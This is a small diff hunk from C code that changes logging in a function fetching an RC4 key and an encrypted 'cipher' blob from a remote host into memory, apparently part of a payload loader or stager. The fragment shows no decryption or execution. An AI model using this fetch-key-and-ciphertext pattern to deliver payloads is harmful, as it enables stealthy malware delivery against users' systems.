@@ -223,11 +223,11 @@ int DownloadHttpToMemory(const char* host, char* port, const char* path, struct 
 void PopulateData(char* host, char* port, char* LocKey, char* LocCipher) {
 	char URL[50] = "/";
 	strcat_s(URL, 50, LocKey);
-	printf("Key Location: http://%s%s", host,URL);
+	info("Key Location: http://%s:%s%s", host, port,URL);
 
 	char cURL[50] = "/";
 	strcat_s(cURL, 50, LocCipher);
-	printf("\nCipher Location: http://%s%s", host,cURL);
+	info("Cipher Location: http://%s:%s%s", host, port,cURL);
 
 	DownloadHttpToMemory(host,port, URL, &rc4Key);
 	DownloadHttpToMemory(host,port, cURL, &cipher);
